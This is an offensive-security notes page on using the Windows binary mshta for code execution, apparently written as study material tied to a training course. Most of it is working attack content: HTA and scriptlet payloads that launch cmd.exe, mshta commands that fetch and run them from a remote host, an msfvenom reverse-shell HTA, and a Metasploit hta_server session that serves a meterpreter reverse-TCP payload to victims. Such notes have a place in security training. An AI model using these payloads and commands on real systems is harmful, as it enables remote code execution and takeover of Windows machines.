# MSHTA


## Theroy
### An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

## Practice

{% tabs %}
{% tab title="Basic HTA" %}

In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.

```bash
#http://10.0.0.5/m.hta
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
We can now execute the script on the target machine
```bash
mshta.exe http://10.0.0.5/m.hta
```
{% endtab %}

{% tab title="scriptlet" %}
Writing a scriptlet file that will launch cmd.exe when invoked:

```bash
#http://10.0.0.5/m.sct
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
	}
]]>
</script>
</scriptlet>
```

We can now execute the script on the target machine
```bash
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```
{% endtab %}

{% tab title="msfvenom" %}

We can use the msfvenom framework to generate hta files.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f hta-psh -o m.hta
```
We can now execute the script on the target machine
```bash
mshta.exe http://10.0.0.5/m.hta
```
{% endtab %}

{% tab title="metasploit" %}

We can use the metasploit framework to generate hta files and directly serv it throught our webserver.

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```
On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.

{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/weaponization" %}
{% embed url="https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution" %}
